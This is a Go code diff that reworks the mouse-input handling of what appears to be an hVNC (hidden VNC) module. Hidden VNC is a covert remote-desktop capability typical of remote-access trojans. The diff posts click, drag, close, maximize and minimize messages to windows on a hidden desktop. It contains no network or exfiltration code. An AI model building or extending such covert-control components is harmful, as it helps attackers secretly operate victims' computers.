@@ -45,6 +45,7 @@ var (
 	procGetAncestor         = user32.NewProc("GetAncestor")
 	procMapVirtualKeyW      = user32.NewProc("MapVirtualKeyW")
 	procToUnicode           = user32.NewProc("ToUnicode")
+	procGetWindowPlacement  = user32.NewProc("GetWindowPlacement")
 )
 
 const (
@@ -104,6 +105,8 @@ const (
 	WM_NCLBUTTONDOWN       = 0x00A1
 	WM_NCLBUTTONUP         = 0x00A2
 	WM_CLOSE               = 0x0010
+	WM_DESTROY             = 0x0002
+	WM_SYSCOMMAND          = 0x0112
 	WM_KEYDOWN             = 0x0100
 	WM_KEYUP               = 0x0101
 	WM_CHAR                = 0x0102
@@ -125,6 +128,10 @@ const (
 	HTBOTTOM               = 15
 	HTBOTTOMLEFT           = 16
 	HTBOTTOMRIGHT          = 17
+	SC_MINIMIZE            = 0xF020
+	SC_MAXIMIZE            = 0xF030
+	SC_RESTORE             = 0xF120
+	SW_SHOWMAXIMIZED       = 3
 	GA_ROOT                = 2
 	SMTO_ABORTIFHUNG       = 0x0002
 )
@@ -790,12 +797,7 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 	pt := point{x: int32(absX), y: int32(absY)}
 	hitHwnd := windowFromPoint(pt)
 	if hitHwnd != 0 {
-		rootHwnd := rootWindow(hitHwnd)
-		if rootHwnd != 0 {
-			rememberWorkingWindow(rootHwnd)
-		} else {
-			rememberWorkingWindow(hitHwnd)
-		}
+		rememberWorkingWindow(hitHwnd)
 		clientPt := pt
 		procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
 		postMouseMessage(hitHwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
@@ -805,30 +807,60 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 
 func hvncMouseButtonOnThread(button int, down bool) error {
 	pt := currentHVNCCursor()
+
+	if button == 0 && !down {
+		endHVNCWindowDrag(pt)
+	}
+
 	hitHwnd := windowFromPoint(pt)
 	if hitHwnd == 0 {
 		return nil
 	}
-	rootHwnd := rootWindow(hitHwnd)
-	if rootHwnd == 0 {
-		rootHwnd = hitHwnd
-	}
-	rememberWorkingWindow(rootHwnd)
+
+	rememberWorkingWindow(hitHwnd)
+
 	if button == 0 {
-		if down {
-			setPendingActivation(rootHwnd)
-		} else {
-			if pending := consumePendingActivation(); pending != 0 && pending != rootHwnd {
-				rootHwnd = pending
+		lparam := makeLParam(pt.x, pt.y)
+		hitTest := safeNCHitTest(hitHwnd, lparam)
+
+		if hitTest != HTCLIENT && hitTest != 0 {
+			if hitTest == HTCLOSE && !down {
+				procPostMessageW.Call(hitHwnd, WM_CLOSE, 0, 0)
+				procPostMessageW.Call(hitHwnd, WM_DESTROY, 0, 0)
+				return nil
+			}
+
+			if hitTest == HTCAPTION {
+				if down {
+					var r rect
+					if ok, _, _ := procGetWindowRect.Call(hitHwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
+						hvncInputMu.Lock()
+						hvncMovingWindow = true
+						hvncWindowToMove = hitHwnd
+						hvncMoveOffset = point{x: pt.x - r.left, y: pt.y - r.top}
+						hvncWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
+						hvncInputMu.Unlock()
+					}
+				}
+				return nil
+			}
+
+			if hitTest == HTMAXBUTTON && !down {
+				if isWindowMaximized(hitHwnd) {
+					procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_RESTORE, 0)
+				} else {
+					procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0)
+				}
+				return nil
+			}
+
+			if hitTest == HTMINBUTTON && !down {
+				procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0)
+				return nil
 			}
 		}
 	}
-	if button == 0 {
-		handleNonClientHit(rootHwnd, pt, down)
-	}
-	if button == 0 && !down {
-		endHVNCWindowDrag(pt)
-	}
+
 	clientPt := pt
 	procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
 
@@ -838,37 +870,32 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 	case 0:
 		if down {
 			msg = WM_LBUTTONDOWN
-			wparam = uintptr(setMouseButton(button, true))
+			wparam = MK_LBUTTON
 		} else {
 			msg = WM_LBUTTONUP
-			wparam = uintptr(setMouseButton(button, false))
+			wparam = 0
 		}
 	case 1:
 		if down {
 			msg = WM_MBUTTONDOWN
-			wparam = uintptr(setMouseButton(button, true))
+			wparam = MK_MBUTTON
 		} else {
 			msg = WM_MBUTTONUP
-			wparam = uintptr(setMouseButton(button, false))
+			wparam = 0
 		}
 	case 2:
 		if down {
 			msg = WM_RBUTTONDOWN
-			wparam = uintptr(setMouseButton(button, true))
+			wparam = MK_RBUTTON
 		} else {
 			msg = WM_RBUTTONUP
-			wparam = uintptr(setMouseButton(button, false))
+			wparam = 0
 		}
 	default:
 		return nil
 	}
 
 	postMouseMessage(hitHwnd, msg, wparam, clientPt)
-
-	// Activate on left-button release after posting click so transient popups remain interactable while hovering.
-	if button == 0 && !down && rootHwnd != 0 {
-		setWorkingWindow(rootHwnd)
-	}
 	return nil
 }
 
@@ -1049,42 +1076,24 @@ func virtualKeyToChars(vk uint16) []rune {
 	return []rune(syscall.UTF16ToString(buf[:ret]))
 }
 
-func handleNonClientHit(hwnd uintptr, screenPt point, down bool) {
-	lparam := makeLParam(screenPt.x, screenPt.y)
-	hitTest := safeNCHitTest(hwnd, lparam)
-	if hitTest == HTCLIENT || hitTest == 0 {
-		return
+func isWindowMaximized(hwnd uintptr) bool {
+	type windowPlacement struct {
+		length         uint32
+		flags          uint32
+		showCmd        uint32
+		ptMinPositionX int32
+		ptMinPositionY int32
+		ptMaxPositionX int32
+		ptMaxPositionY int32
+		rcNormalLeft   int32
+		rcNormalTop    int32
+		rcNormalRight  int32
+		rcNormalBottom int32
 	}
-
-	if hitTest == HTCLOSE && !down {
-		procPostMessageW.Call(hwnd, WM_CLOSE, 0, 0)
-		return
-	}
-
-	if hitTest == HTCAPTION {
-		if down {
-			var r rect
-			if ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
-				hvncInputMu.Lock()
-				hvncMovingWindow = true
-				hvncWindowToMove = hwnd
-				hvncMoveOffset = point{x: screenPt.x - r.left, y: screenPt.y - r.top}
-				hvncWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
-				hvncInputMu.Unlock()
-			}
-		} else {
-			endHVNCWindowDrag(screenPt)
-		}
-		return
-	}
-
-	if hitTest == HTLEFT || hitTest == HTRIGHT || hitTest == HTTOP || hitTest == HTBOTTOM || hitTest == HTTOPLEFT || hitTest == HTTOPRIGHT || hitTest == HTBOTTOMLEFT || hitTest == HTBOTTOMRIGHT || hitTest == HTMINBUTTON || hitTest == HTMAXBUTTON {
-		msg := WM_NCLBUTTONDOWN
-		if !down {
-			msg = WM_NCLBUTTONUP
-		}
-		procPostMessageW.Call(hwnd, uintptr(msg), uintptr(hitTest), lparam)
-	}
+	var wp windowPlacement
+	wp.length = uint32(unsafe.Sizeof(wp))
+	procGetWindowPlacement.Call(hwnd, uintptr(unsafe.Pointer(&wp)))
+	return wp.showCmd == SW_SHOWMAXIMIZED
 }
 
 func safeNCHitTest(hwnd uintptr, lparam uintptr) int32 {
